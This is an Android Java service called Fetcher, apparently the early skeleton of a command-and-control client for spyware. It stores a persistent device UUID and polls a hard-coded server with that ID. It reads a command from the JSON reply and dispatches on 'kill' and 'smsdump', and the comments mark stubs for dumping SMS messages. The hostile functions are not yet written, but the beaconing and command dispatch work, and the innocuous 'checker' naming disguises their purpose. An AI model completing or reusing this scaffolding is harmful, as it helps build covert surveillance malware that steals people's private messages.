package com.app.checker;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class Fetcher extends Service {

    final String SERVER_IP = "192.168.1.4";
    final int SERVER_PORT = 80;
    final String FILE_NAME = "test.json";
    final String FULL_URL = "http://"+SERVER_IP+":"+SERVER_PORT+"/"+FILE_NAME;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT).show();;

        // Check or store UUID to uniquely identify the device
        SharedPreferences sPrefs= PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        String check =sPrefs.getString("uuid",null);
        if (check == null){
            SharedPreferences.Editor editor = sPrefs.edit();
            UUID uuid = java.util.UUID.randomUUID();
            editor.putString("uuid", uuid.toString());
            editor.commit(); // Store UUID permanently in the device
        }

        final String id =sPrefs.getString("uuid",null);

        try{
            if(isConnected()){ // Check if device has a network connection
                new JsonTask().execute(FULL_URL+"?id="+id);
            } else {
                Toast.makeText(getApplicationContext(), "No network connection", Toast.LENGTH_LONG).show();
            }
        }
        catch (Exception e){
            e.printStackTrace();
        }

        return Service.START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // HTTP Request for JSON objects
    private class JsonTask extends AsyncTask<String,String,String> {
        protected void onPreExecute()
        {
            super.onPreExecute();
        }

        private static final String REQUEST_METHOD = "GET";
        private static final int READ_TIMEOUT = 15000;
        private static final int CONNECTION_TIMEOUT = 15000;

        @Override
        protected String doInBackground(String... params) {
            HttpURLConnection conn = null;
            BufferedReader buff = null;
            try{
                URL url = new URL(params[0]);
                conn = (HttpURLConnection)url.openConnection();
                conn.setRequestMethod(REQUEST_METHOD);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setConnectTimeout(CONNECTION_TIMEOUT);
                conn.connect();

                InputStream stream = conn.getInputStream();

                buff = new BufferedReader(new InputStreamReader(stream));
                StringBuffer buffer = new StringBuffer();

                String line;
                while ((line = buff.readLine()) != null) {
                    buffer.append(line);
                }
                return buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
                try {
                    if (buff != null) {
                        buff.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        // After fetching JSON response
        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);

            String task;

            if(result != null){ // Check if the server is reachable
                try {
                    JSONObject json = new JSONObject(result);
                    task = json.getString("message");
                    if(task.equals("kill")){
                        // Useless as of now because the service gets invoked by AlarmManager
                    } else if(task.equals("smsdump")) {
                        // Functions to dump sms
                    } else {
                        // Other functions to be implemented
                    }
                } catch (JSONException e) {
                    Log.e("Error",e.getMessage());
                }
            } else {
                Toast.makeText(getApplicationContext(), "Server not reachable", Toast.LENGTH_LONG).show();
            }
        }
    }

    public boolean isConnected() {
        ConnectivityManager connMan = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = connMan.getActiveNetworkInfo();

        if (netInfo != null && netInfo.isConnected()) {
            return true;
        } else {
            return false;
        }
    }
}